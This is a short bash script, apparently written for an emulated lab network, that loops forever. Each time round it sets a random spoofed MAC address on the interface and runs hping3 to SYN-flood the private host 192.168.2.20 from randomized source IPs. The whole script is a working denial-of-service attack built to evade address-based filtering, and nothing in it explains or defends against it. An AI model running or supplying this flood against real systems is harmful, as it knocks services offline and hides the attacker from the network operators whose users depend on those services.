#!/bin/bash

while true; do
    # Generate random MAC using /dev/urandom instead of $RANDOM
    MAC=$(hexdump -n5 -e '/1 ":%02X"' /dev/urandom)
    MAC="02$MAC"    # ensure unicast locally administered MAC

    echo "Using MAC: $MAC"

    ifconfig h1-eth0 hw ether $MAC

    # Flood with randomized IPs
    hping3 192.168.2.20 -S --flood --rand-source -c 200

done




